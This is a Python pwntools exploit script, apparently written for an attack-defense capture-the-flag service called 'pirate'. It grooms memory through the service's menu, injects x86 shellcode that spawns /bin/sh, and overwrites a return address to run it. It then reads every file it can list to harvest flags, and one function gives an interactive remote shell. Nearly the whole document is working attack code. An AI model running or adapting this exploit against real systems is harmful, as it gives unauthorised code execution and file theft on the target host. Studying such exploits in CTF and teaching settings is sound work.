from pwn import *
import sys

shellcode = "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"

def print_pir(c,b):
    data = "none"
    while(data[0:3] != "[7]"):
        data = c.recvline()
        data = data[:-1]
        if(b):
            print data

def search_pir(c, ind, b):
    c.sendline("1")
    data = c.recvline()
    if(b):
        print data
    print_pir(c,b)
    while(data != "> Entry created at " + ind):
        c.sendline("2")
        print_pir(c,b)
        c.sendline("1")
        data = c.recvline()
        data = data[:-1]
        if(b):
            print data
        else:
            sys.stdout.write(".")
            sys.stdout.flush()
        print_pir(c,b)

def send_shellcode(c,b):
    c.sendline("3")
    c.send(shellcode + 'A'*(4096-len(shellcode)) + "EXPLOIT_ME\n")
    print_pir(c,b)
    c.sendline("4")
    c.send('A'*12 + '\xac\xa6\x04\x08\x0a')

def pirate_exploit(host, port, b):
    c = connect(host, port)
    sys.stdout.write("Start exploiting")
    sys.stdout.flush()
    print_pir(c,b)
    search_pir(c,"00030000",b)
    send_shellcode(c,b)
    if(b):
        print "pulizia " + c.recv() + c.recv()
    else:
        c.recv() + c.recv()
    c.sendline("ls | grep -v _") 
    time.sleep(0.1)
    data = c.recv()
    files = data.split()
    flags = ""
    for name in files:
        c.sendline("cat " + name)
        time.sleep(0.1)
        flag = c.recv()
        if(b):
            print("flag: " + flag)
        flags = flags + flag + "\n"
    print("DONE!!;-)")
    return flags[:-1]


def exploit_pir_pot(host, port, b):
    c = connect(host, port)
    sys.stdout.write("Start exploiting")
    sys.stdout.flush()
    print_pir(c,b)
    search_pir(c,"00030000",b)
    send_shellcode(c,b)
    command = "none"
    while(command[:4] != "exit"):
        command = raw_input("$")
        c.sendline(command)
        time.sleep(0.1)
        print c.recv()


def pirate_exploit_id(host, port, flag_id,b):
    c = connect(host, port)
    sys.stdout.write("Start exploiting")
    sys.stdout.flush()
    print_pir(c,b)
    search_pir(c,"00030000",b)
    send_shellcode(c,b)
    if(b):
        print "pulizia " + c.recv() + c.recv()
    else:
        c.recv() + c.recv()
    c.sendline("cat %s" % flag_id) 
    time.sleep(0.1)
    flag = c.recv()
    print flag
    print("DONE!!;-)")
    return flag

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print "Usage: %s <ip> <port>" % os.path.basename(__file__)
        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]
    print pirate_exploit(ip,port,0)
